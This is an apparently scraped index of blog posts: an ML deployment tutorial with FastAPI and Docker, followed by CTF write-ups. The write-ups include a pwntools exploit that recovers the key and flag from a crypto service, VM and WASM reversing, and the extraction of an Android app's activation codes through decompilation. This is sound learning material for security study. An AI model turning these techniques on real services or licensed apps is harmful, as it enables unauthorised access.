LinkedIn.\n","date":1611559393,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1611559393,"objectID":"0f04cfd38b29569f8a03550dc03310cf","permalink":"https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/","publishdate":"2021-01-25T12:53:13+05:30","relpermalink":"/post/2021-01-25_deep_learning_in_the_browser/","section":"post","summary":"After my last post on deploying Machine Learning and Deep Learning models using FastAPI and Docker, I wanted to explore a bit more on deploying deep learning models. My last post discussed a server-side method for deploying the model. This post will discuss client side frameworks and techniques to deploy those models such that they work directly on the client side.\nIn this tutorial I will be giving an overview of three frameworks, Tensorflow.","tags":["deep learning","machine learning","deployment","web"],"title":"Deep Learning in the Browser - Exploring TF.js, WebDNN and ONNX.js","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Machine Learning"],"content":"The goal of this blog post is to make an API to get predictions from a pre-trained ML model and how we can do that in a fast manner using FastAPI and also be able to ship it using Docker.\nThis method does not scale well as it does not support caching and cannot handle much load. However, this can be a good instructional post on how you can deploy those models and use them for small low-scale projects, say a hackathon.\nIn the tutorial we will use the very famous Iris dataset. The dataset has 4 features -\n Sepal Length Sepal Width Petal Length Petal Width  These lengths are in cm, and these fields are used to predict the type of the Iris, among 3 categories - Setosa, Versicolour and Virginica.\nProject Structure Given below is the outline of the files and location of the files so that it is easier for one to follow the tutorial.\nml-deployment/\r│ .gitignore\r│ Dockerfile\r│ logs.log\r│ README.md\r│ request.py\r│ requirements.txt\r│ server.py\r│\r├───models\riris.py\rmodel.pkl\rmodel.py\rModel Training Since the goal here is just to make a POC deployment, we make a very simple model trained on the Iris dataset. Some very basic knowledge of Scikit-learn libraries will be needed to understand the code.\n The model is saved in a pickle format. We will load the saved model to do predictions later.\nNow, along with this, we have to ensure that when the API will receive the paprameters, it receives them in a proper format, for example, a list of lists in which each list has 4 float values for the features.\nFor that we use Pydantic.\n Creating the API As mentioned earlier, we use FastAPI to make our API. From the website -\n FastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.6+ based on standard Python type hints.\n It also claims to have Very high performance, on par with NodeJS and Go (thanks to Starlette and Pydantic). One of the fastest Python frameworks available.\nThe whole code is given below, I\u0026rsquo;ll explain the details below as well.\n Here, we define the name of our app.\napp = FastAPI(title=\u0026#34;Iris Classifier API\u0026#34;, description=\u0026#34;API for Iris classification using ML\u0026#34;, version=\u0026#34;1.0\u0026#34;)\rNext, we set up logging for our API as well, to ensure we can see WHEN something went wrong, in case something does go wrong.\n# Initialize logging\r my_logger = logging.getLogger()\rmy_logger.setLevel(logging.DEBUG)\rlogging.basicConfig(level=logging.DEBUG, filename=\u0026#39;logs.log\u0026#39;)\rThen we use a FastAPI decorator called @app.on_event(\u0026quot;startup\u0026quot;) to specify the operation which we want to perform when the server starts up. Here we load our model so that once the model is loaded in the initial phase, the predictions can be served as fast as possible.\n@app.on_event(\u0026#34;startup\u0026#34;)\rdef load_model():\rmodel = pickle.load(open(\u0026#34;models/model.pkl\u0026#34;, \u0026#34;rb\u0026#34;))\rFinally, our main logic of serving the predictions -\nWe get the data that the API receives from the server and require it to be in the Iris format, which we specified using Pydantic.\nWe run the model on those examples, get the predictions and then map them to the flower type. The classification and the model probability of the prediction is returned as a JSON response.\nWe have a try-catch blog to make ensure any wrong input format or any other kinds of errors does not break the server.\nLet\u0026rsquo;s see it in action The FastAPI provides a dashboard from where we send requests to the API. It is at http://localhost:8000/docs.\n\r\r\rSending sample request to FastAPI\r\r\r\r\r\rResponse from FastAPI\r\r\rDockerise Everything! So now, if we have to ship it, we want to convert it into a Docker image.\nFor that we create a Dockerfile.\n Basically, the Dockerfile instructs Docker to first create a /app folder inside the Docker python3.8 base image, install the requirements (Python packages) and then run the app on port 8000 in the Docker container, and expose that port to access it from our local machine.\nNow, we just have to run two commands -\n$ docker build -t iris-ml . # Build the Docker image\r$ docker run -d -p 8000:8000 --name iris-api iris-ml # Run the Docker image as container\rThe requirements.txt for the project are also listed below -\nnumpy==1.18.4\rpydantic==1.6.1\rrequests==2.24.0\rfastapi==0.61.1\rscikit_learn==0.23.2\ruvicorn==0.11.8\rNow you can head to http://localhost:8000/docs to test the API.\nIf you see the dashboard and the responses similar to the screenshots above, you have most likely deployed it successfully.\nCongratulations!! Now that you have the Docker image, the entire environment can be recreated on any other machine. You can push the image to DockerHub (refer here) or export as a tar file to share to another host.\n The entire code is also available on my Github - https://github.com/shreyansh26/Weekend-Projects/tree/master/MLDeployment/v1\n This is all for now. I will also be writing about few other approaches to deploy relatively heavier models and also scalable approaches to Model hosting. Thanks for reading!\n\rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1606715513,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1606715513,"objectID":"48681676f97ca2f4514b674a29ab5fd2","permalink":"https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/","publishdate":"2020-11-30T11:21:53+05:30","relpermalink":"/post/2020-11-30_fast_api_docker_ml_deploy/","section":"post","summary":"The goal of this blog post is to make an API to get predictions from a pre-trained ML model and how we can do that in a fast manner using FastAPI and also be able to ship it using Docker.\nThis method does not scale well as it does not support caching and cannot handle much load. However, this can be a good instructional post on how you can deploy those models and use them for small low-scale projects, say a hackathon.","tags":["ml","deployment","web"],"title":"Quick tutorial to deploy your ML models using FastAPI and Docker","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"crypto 115 - 108 solves  We intercept an algorithm that is used among Androids. There are many hidden variables. Is it possible to recover the message?\n  Author: andre_smaira\n  Server: nc encryption.pwn2.win 1337\n Challenge link\nChallenge files\nOn connecting to the challenge service, we are given two options -\n\r\r\rAlso, in the server.py file, we see there are two functions, enc_plaintext and enc_flag. Both these functions call the encrypt function.\nThe enc_plaintext functions calls encrypt with the plaintext supplied by the user (encoded in base64), key1 and iv1 (which are secret values) as arguments.\nThe enc_flag fucntion takes as arguments the secret flag and iv2 and key2 which are actually derived from iv1, key1 and the flag.\niv2 = AES.new(key1, AES.MODE_ECB).decrypt(iv1)\rkey2 = xor(to_blocks(flag))\rThe encrypt function returns the base64 encoding of the (iv+ciphertext) string.\nExploit We see that every time encrypt is called, the key2 and iv2 values are updated. iv2 becomes the AES-ECB decryption of the old iv2 and key2 is now the first block of the ciphertext (since the xor function with one argument simply returns the first block of the argument). So, our goal is now to recover the key2 and iv2 values so we can then reverse the encrypt_flag function and recover the flag.\n\r\r\rIf we call encrypt_flag (Choice 2) the first time, then the new key2 value will be the first block of the ciphertext. Nnow during this, the iv2 has also been updated but we don\u0026rsquo;t know that value, since the first part of the returned value, is the old iv2.\nSo, what we do next is call the encrypt_flag (Choice 2) function again, then we get the new iv2 value along with the ciphertext. This means taht now we know the iv2 and the key2 value taht was used to encrypt the flag to obtain the ciphertext. What remains now, is just to reverse the encrypt function and call it with our values of the ciphertext, key2 and iv2. This will get us the flag.\nThe decrypt function can be written as -\nassert len(key) == BLOCK_SIZE, f\u0026#39;Invalid key size\u0026#39;\rassert len(iv) == BLOCK_SIZE, \u0026#39;Invalid IV size\u0026#39;\rassert len(txt) % BLOCK_SIZE == 0, \u0026#39;Invalid plaintext size\u0026#39;\rbs = len(key)\rblocks = to_blocks(txt)\rctxt = b\u0026#39;\u0026#39;\raes = AES.new(key, AES.MODE_ECB)\rcurr = iv\rfor block in blocks:\rctxt += xor(curr, aes.decrypt(block)) # Inverse of the encrypt function\r curr = xor(ctxt[-bs:], block)\rreturn ctxt\rThe complete exploit code is shown below -\nfrom pwn import *\rimport base64\rfrom Crypto.Cipher import AES\rp = remote(\u0026#34;encryption.pwn2.win\u0026#34;, 1337)\r# context.log_level = \u0026#39;debug\u0026#39;\r BUFF = 256\rBLOCK_SIZE = 16\rkey2 = None\riv2 = None\rdef to_blocks(txt):\rreturn [txt[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE] for i in range(len(txt)//BLOCK_SIZE)]\rdef xor(b1, b2=None):\rif isinstance(b1, list) and b2 is None:\rassert len(set([len(b) for b in b1])) == 1, \u0026#39;xor() - Invalid input size\u0026#39;\rassert all([isinstance(b, bytes) for b in b1]), \u0026#39;xor() - Invalid input type\u0026#39;\rx = [len(b) for b in b1][0]*b\u0026#39;\\x00\u0026#39;\rfor b in b1:\rx = xor(x, b)\rreturn x\rassert isinstance(b1, bytes) and isinstance(b2, bytes), \u0026#39;xor() - Invalid input type\u0026#39;\rreturn bytes([a ^ b for a, b in zip(b1, b2)])\rdef decrypt(txt, key, iv):\rassert len(key) == BLOCK_SIZE, f\u0026#39;Invalid key size\u0026#39;\rassert len(iv) == BLOCK_SIZE, \u0026#39;Invalid IV size\u0026#39;\rassert len(txt) % BLOCK_SIZE == 0, \u0026#39;Invalid plaintext size\u0026#39;\rbs = len(key)\rblocks = to_blocks(txt)\rctxt = b\u0026#39;\u0026#39;\raes = AES.new(key, AES.MODE_ECB)\rcurr = iv\rfor block in blocks:\rctxt += xor(curr, aes.decrypt(block)) # Inverse of the encrypt function\r curr = xor(ctxt[-bs:], block)\rreturn ctxt\rdef encrypt_flag(p):\rp.recvuntil(b\u0026#34;Choice: \u0026#34;)\rp.sendline(b\u0026#34;2\u0026#34;)\rx = p.recvline().strip()\ry = base64.b64decode(x)\rreturn y[:16], y[16:]\rdef enc_plaintext(p, plaintext):\rp.recvuntil(b\u0026#34;Choice: \u0026#34;)\rp.sendline(b\u0026#34;1\u0026#34;)\rp.recvuntil(b\u0026#34;Plaintext: \u0026#34;)\rp.sendline(plaintext)\rx = p.recvline().strip()\ry = base64.b64decode(x)\rreturn y[:16], y[16:]\rdef getDecoding(s):\ry = base64.b64decode(s)\rreturn y[:16], y[16:]\riv2_orig, flag_enc_orig = encrypt_flag(p)\rprint(iv2_orig)\rprint(flag_enc_orig)\rkey2_new = xor(to_blocks(flag_enc_orig))\rprint(b\u0026#34;Key2 :\u0026#34; + key2_new)\riv2_new, flag_enc_cipher_new = encrypt_flag(p)\rprint(b\u0026#34;iv2 :\u0026#34;, iv2_new)\rprint(b\u0026#34;flag_cipher_new :\u0026#34;, flag_enc_cipher_new)\rprint(decrypt(flag_enc_cipher_new, key2_new, iv2_new).decode())\rRunning this, prints the flag - CTF-BR{kn3W_7h4T_7hEr3_4r3_Pc8C_r3pe471ti0ns?!?}\nAnd yeah, after reading the flag, I realised it was actually AES in PCBC mode.\n \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1590994966,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1590994966,"objectID":"c6a11617f63e73184f5987eb9b0ed642","permalink":"https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/","publishdate":"2020-06-01T12:32:46+05:30","relpermalink":"/post/2020-06-01_androids_encryption-pwn2win-2020/","section":"post","summary":"crypto 115 - 108 solves  We intercept an algorithm that is used among Androids. There are many hidden variables. Is it possible to recover the message?\n  Author: andre_smaira\n  Server: nc encryption.pwn2.win 1337\n Challenge link\nChallenge files\nOn connecting to the challenge service, we are given two options -\n\r\r\rAlso, in the server.py file, we see there are two functions, enc_plaintext and enc_flag.","tags":["crypto","infosec","writeups"],"title":"Androids Encryption (Crypto) - Pwn2Win CTF 2020","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"Get the challenge from here\n vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).\n  Rules \u0026amp; Information You are not require to run vm1.exe, this challenge is static analysis only. Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating. Analysis can be done using the free version of IDA Pro (you don’t need the debugger).\n We are given two files - vm1.exe and ram.bin, and according to the problem statement, ram.bin contains the bytecode for the VM and the flag encrypted in it somwehow.\nI used IDA Pro to analyse the binary. I started off with the start function.\n\r\r\rFirst, there are a few calls to some MD5 related functions, those are to display the MD5 hash of the flag when we run the program.\nThen there is a call to GetProcessHeap and HeapAlloc which basically allocates a memory of size 0x1FB. After that we have a call to memcpy that copies data from unk_404040 to the newly allocated memory (renamed to bytecode). On taking a look at the bytes at that location, they are exactly the same as ram.bin so this is the memory location that is mentioned in the problem statement.\nWe move straight to the read_bytecode_from_memory function (sub_4022E0 before renaming).\n\r\r\rHere first eax is set to 1 and then there is a loop that runs until eax does not become 0. The body of the loop basically read 3 bytes of the bytecode sequentially, stores it and passes it to the function evaluate (sub_402270 before renaming).\n\r\r\rThis is the function where the VM bytecode is interpreted. The function has 3 arguments, which are basically 3 bytes of the bytecode passed from the read_bytecode_from_memory function. For evaluation, the first parameter is checked first -\n If it is 1, then the memory location at offset param2 is assigned param3 and eax is set to 1. If it is 2, then a variable, byte_404240 is set to the value at memory location at offset param2 and eax is set to 1. If it is 3, then the value at offset param2 is XORed with the value of byte_404240 and stored back at the offset of param2. Otherwise, if it is not 3 then al is set to 0, i.e. eax is now zero and the loop in read_bytecode_from_memory should now stop.  After the loop in read_bytecode_from_memory ends we know that now, the flag is in the memory, precisely at the location unk_404040.\nSo, we can basically emulate the whole functionality with a python script and then get the flag from the converted data.\nI wrote the following script.\ndata = [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0DE, 0x7E, 0x7D, 0x55, 0x1E, 0x5, 0x0E6, 0x9F, 0x0E4, 0x0A6, 0x47, 0x50, 0x2, 0x1, 0x0C7, 0x0FC, 0x0CB, 0x60, 0x9, 0x0C6, 0x0E, 0x2E, 0x41, 0x65, 0x0A4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1D, 0x0BD, 0x1, 0x5, 0x53, 0x1, 0x12, 0x48, 0x1, 0x10, 0x0E6, 0x1, 0x13, 0x8A, 0x1, 0x0D, 0x47, 0x1, 0x16, 0x13, 0x1, 0x0A, 0x15, 0x1, 0x0, 0x98, 0x1, 0x2, 0x3C, 0x1, 0x18, 0x0D9, 0x1, 0x1A, 0x57, 0x1, 0x6, 0x0AB, 0x1, 0x1B, 0x0C6, 0x1, 0x1, 0x32, 0x1, 0x17, 0x20, 0x1, 0x15, 0x6F, 0x1, 0x11, 0x2D, 0x1, 0x8, 0x0C9, 0x1, 0x9, 0x0E7, 0x1, 0x3, 0x12, 0x1, 0x0C, 0x2F, 0x1, 0x0E, 0x88, 0x1, 0x19, 0x6C, 0x1, 0x4, 0x65, 0x1, 0x1E, 0x0AE, 0x1, 0x14, 0x59, 0x1, 0x1F, 0x91, 0x1, 0x1C, 0x5D, 0x1, 0x0F, 0x0AE, 0x1, 0x0B, 0x15, 0x1, 0x7, 0x0CC, 0x2, 0x20, 0x0, 0x3, 0x0, 0x0, 0x2, 0x21, 0x0, 0x3, 0x1, 0x0, 0x2, 0x22, 0x0, 0x3, 0x2, 0x0, 0x2, 0x23, 0x0, 0x3, 0x3, 0x0, 0x2, 0x24, 0x0, 0x3, 0x4, 0x0, 0x2, 0x25, 0x0, 0x3, 0x5, 0x0, 0x2, 0x26, 0x0, 0x3, 0x6, 0x0, 0x2, 0x27, 0x0, 0x3, 0x7, 0x0, 0x2, 0x28, 0x0, 0x3, 0x8, 0x0, 0x2, 0x29, 0x0, 0x3, 0x9, 0x0, 0x2, 0x2A, 0x0, 0x3, 0x0A, 0x0, 0x2, 0x2B, 0x0, 0x3, 0x0B, 0x0, 0x2, 0x2C, 0x0, 0x3, 0x0C, 0x0, 0x2, 0x2D, 0x0, 0x3, 0x0D, 0x0, 0x2, 0x2E, 0x0, 0x3, 0x0E, 0x0, 0x2, 0x2F, 0x0, 0x3, 0x0F, 0x0, 0x2, 0x30, 0x0, 0x3, 0x10, 0x0, 0x2, 0x31, 0x0, 0x3, 0x11, 0x0, 0x2, 0x32, 0x0, 0x3, 0x12, 0x0, 0x2, 0x33, 0x0, 0x3, 0x13, 0x0, 0x2, 0x34, 0x0, 0x3, 0x14, 0x0, 0x2, 0x35, 0x0, 0x3, 0x15, 0x0, 0x2, 0x36, 0x0, 0x3, 0x16, 0x0, 0x2, 0x37, 0x0, 0x3, 0x17, 0x0, 0x2, 0x38, 0x0, 0x3, 0x18, 0x0, 0x1, 0x19, 0x0, 0x4, 0x0, 0x0, 0x0]\ri = 0\rbval = 0\rret = 1\rwhile ret:\ropcode = data[i+0xFF]\rop1 = data[i+1+0xFF]\rop2 = data[i+2+0xFF]\r# print(\u0026#34;{}, {}, {}\u0026#34;.format(opcode, op1, op2))\r if opcode == 1:\rdata[op1] = op2\relif opcode == 2:\rbval = data[op1]\relif opcode == 3:\rdata[op1] = data[op1] ^ bval\relif opcode != 3:\rret = 0\ri += 3\rprint(data)\rThe first few numbers look like ASCII, converting them,\ndata = [70, 76, 65, 71, 123, 86, 77, 83, 45, 65, 82, 69, 45, 70, 79, 82, 45, 77, 65, 76, 87, 65, 82, 69, 125]\rdata = [chr(x) for x in data]\rprint(\u0026#39;\u0026#39;.join(data))\rWe get the flag - FLAG{VMS-ARE-FOR-MALWARE}\n \rSubscribe to my posts! --\rSubscribe to my posts!\r\r.example_a {\rcolor: #fff !important;\rtext-transform: uppercase;\rtext-decoration: none;\rbackground: #3f51b5;\rpadding: 20px;\rborder-radius: 5px;\rcursor: pointer;\rdisplay: inline-block;\rborder: none;\rtransition: all 0.4s ease 0s;\r}\r.example_a:hover {\rbackground: #434343;\rletter-spacing: 1px;\r-webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\r-moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);\rbox-shadow: 5px 40px -10px rgba(0,0,0,0.57);\rtransition: all 0.4s ease 0s;\r}\r\rfunction showMailingPopUp() {\rwindow.dojoRequire([\"mojo/signup-forms/Loader\"], function(L) { L.start({\"baseUrl\":\"mc.us4.list-manage.com\",\"uuid\":\"0b10ac14f50d7f4e7d11cf26a\",\"lid\":\"667a1bb3da\",\"uniqueMethods\":true}) })\rdocument.cookie = \"MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC\";\r}\rdocument.getElementById(\"openpopup\").onclick = function() {showMailingPopUp()};\r\r Follow me on Twitter, Github or connect on LinkedIn.\n","date":1578138868,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1578138868,"objectID":"3d248fec370afd050516d18a97bd6750","permalink":"https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/","publishdate":"2020-01-04T17:24:28+05:30","relpermalink":"/post/2020-01-04_malwaretech-vm1-challenge/","section":"post","summary":"Get the challenge from here\n vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).","tags":["rev","malware","infosec","writeups"],"title":"MalwareTech's VM1 Reversing Challenge","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"The hxp CTF happens every year along with the Chaos Communication Congress (a top security conference). This year was the 36th edition. This CTF is a major CTF, you know this when the CTF has a rating weight of 63.0 on CTFTime. Also, it is one of the qualifier events of DEFCON 2020 CTF.\nI was playing solo on this one and gave one day to this CTF. I managed to solve 2 problems in the main CTF and 2 in the Junior CTF.\nHere are the writeups for the challenges I solved.\n Main CTF 1337 Skills - Android, Rev  App: Link\nConnection: nc 88.198.154.132 7002\n First, I installed the app on my phone, to try to play around with it a bit. But the very first page was a login type screen asking for a code. I knew I had to open it in a decompiler to see what is happening and figure out the code. I extracted the APK of the app and opened it up in jadx.\nFirst I took a look at the AndroidManifest.xml, to find the launcher activity.\n\r\r\rThe class we have to check out first is the com.progressio.wildskills.MainActivity. Opening this we see that the onCreate method calls the activateApp method to check the activation code.\npublic void activateApp(View view) {\rint i;\rtry {\ri = Integer.parseInt(this.editTextActivation.getText().toString());\r} catch (NumberFormatException unused) {\ri = -1;\r}\rCalendar instance = Calendar.getInstance();\rif (i == ((int) (Math.pow((double) (instance.get(3) * instance.get(1)), 2.0d) % 999983.0d))) {\rfindViewById(R.id.scrollViewActivation).setVisibility(4);\r((InputMethodManager) getSystemService(\u0026#34;input_method\u0026#34;)).hideSoftInputFromWindow(this.editTextActivation.getWindowToken(), 0);\rSharedPreferences.Editor edit = this.prefsmain.edit();\redit.putBoolean(\u0026#34;Activated\u0026#34;, true);\rlong time = new Date().getTime();\redit.putLong(\u0026#34;Installed\u0026#34;, time);\redit.putLong(\u0026#34;ActivationDate\u0026#34;, time);\redit.commit();\rreturn;\r}\rToast.makeText(this, \u0026#34;Ungültiger Aktivierungscode\u0026#34;, 1).show();\rthis.editTextActivation.requestFocus();\r((InputMethodManager) getSystemService(\u0026#34;input_method\u0026#34;)).showSoftInput(this.editTextActivation, 1);\r}\rWe have to pay attenton to\ni = ((int) (Math.pow((double) (instance.get(3) * instance.get(1)), 2.0d) % 999983.0d))\rFor 29th December 2019, this value is a constant and equal to 76429. Entering this, we get access to the app. Next on the top right corner of the app, there are options namely Sales, Leadership, Smart Profuction (the current page) and Service Roadmap. Each of these (except Smart Production) require their own activation codes. We deg deeper into the app\u0026rsquo;s code for this.\nOne thing I note is that on entering a wrong code, the following message is shown as a Toast - \u0026ldquo;Ungültiger Aktivierungscode\u0026rdquo;. So, I used Jadx\u0026rsquo;s Text Search to find all instances of this. We find this\n\r\r\rThese are basically the codes for the three sections. Now all we have to do is connect to the given server and port and answer with these codes.\nActivation code: 76429\ractivated!\rSales activation code: sgk258\ractivated!\rLeadership activation code: wmt275\ractivated\rService Roadmap (SRM) activation code: udh736\ractivated!\rAfter this, we get the flag - hxp{thx_f0r_4773nd1n6_70d4y}\n xmas_future - Rev Files: files.zip\nThis challenge is really close to my heart because this was the FIRST time ever I solved a WASM reveresing challenge. I literally had no clue on how to proceed, did a bit of researching and finally worked it out.\nFirst I thought of converting the .wasm file into some readable code like in C. I used the official WebAssembly binary toolkit (wabt) for this. I used both the wasm2c and wasm2wat to get readable code. In the C file, there was one interesting function which was being called from the hxp2019.js file, the check function, specifically the $hxp2019::check::h578f31d490e10a31 fnction. But it was a lot of code and I couldn\u0026rsquo;t make anyting out of it. Then I decided to read few wasm related CTF writeups. I learnt that I could actually use the debugger in the Chrome DevTools to go through it.\nOpening the html file directly in the browser wasn\u0026rsquo;t loading the js file due to CORS. I copied the folder into my /var/www/html folder and accessed it from there using localhost.\nFirst I set a breakpoint at line 71 of the hxp2019.js file.\n\r\r\rStepping through the code line by line, we then get into the wasm code after line 73, i.e the wasm.check() function which passes the address where our input flag is stored and the length of the input. After this, on stepping into it, our code jumps into the wasm code.\n\r\r\rStepping through each line (and after having done this over and over many times, I kind of understood what each line of the code was doing), we reach line 12 where actually our length of input is being checked with 50. So, we have to make our input length 50. We supply a dummy flag hxp{45 times 'a'}. Then we see that on stepping throght the code, and doing a lot of calculations on some array stored in memory, each character of our input is sequentially comapred with another character. The character to be compared with is loaded at line 284.\n\r\r\r\r\r\rHere, we see that the first character (\u0026lsquo;a\u0026rsquo; = 97) is to be compared with (109 = \u0026lsquo;m\u0026rsquo;). What I did next, may not be the right way, but I was so excited that I had made progress was that I did this whole process 45 times, adding one character to my \u0026ldquo;flag\u0026rdquo; at a time until I had all characters of the flag. I had tried changing the code at line 288 to br_if 1 but that seemed to crash somewhere. Anyways, whatever works during the CTF :stuck_out_tongue:.\nThe flag was - hxp{merry_xmas___github.com/benediktwerner/rewasm}\nThis could probably be the author of the chllenge as the repo is wasm reverse engineering tool. Loved the challenge!\n Junior CTF tracer - Forensics File: file\nThe file looks like strace running on some process. I decided to scroll right to the very bottom and saw\n541 write(1, \u0026quot;\\\u0026quot;Flag\\\u0026quot;\u0026quot;, 6) = 6\r541 write(1, \u0026quot; [New] 1L, 24C written\u0026quot;, 22) = 22\r541 write(3, \u0026quot;b0VIM 8.0\\0\\0\\0\\0\\20\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\35\\2\\0\\0root\u0026quot;..., 4096) = 4096\r541 write(4, \u0026quot;# This viminfo file was generate\u0026quot;..., 1035) = 1035\rThis meant that at the end something was being written to a file named Flag using vim. I started looking at the preceeding lines and saw text or vim commands being typed in (i.e the read command). From line no. 65782, is the interetsing part. This has \u0026lsquo;i\u0026rsquo; bein read, which is the command for insert in vim, that is typing began from here.\n\r\r\rNow all I did was to focus on the read commands and type in whatever that was read on my local computer in vim. I treated \\33 as escape and just typed in whatever was being given as input as in the trace file.\nEventually I ended with some text which seemed meaningful, there was some slight error whic I fixed by intuition.\nThe flag was - junior-nanoiswayBETTER!\n maybe - Rev File: chal1\nWe open up the file in Ghidra and head to the main function.\n\r\r\rBasically, if we see, the function is not doing anything, it is just taking our input of length 0x24 as a command line argument, then storing it at a +0x40 offset from a fixed string in memory, i.e. \u0026ldquo;junior-totally_the_flag_or_maybe_not\u0026rdquo;. The rest of the computations don\u0026rsquo;t mean anything as uvar3, ivar1, all are keeping the input unchanged. But the program still outputs \u0026ldquo;wrong!\u0026rdquo; and there does not seem to be any checking.\nAfter this I opened up GDB to analyse the flow. I set a breakpoint at the main function, and observed something interesting.\n\r\r\rThe fixed string \u0026ldquo;junior-totally_the_flag_or_maybe_not\u0026rdquo; is now changed to 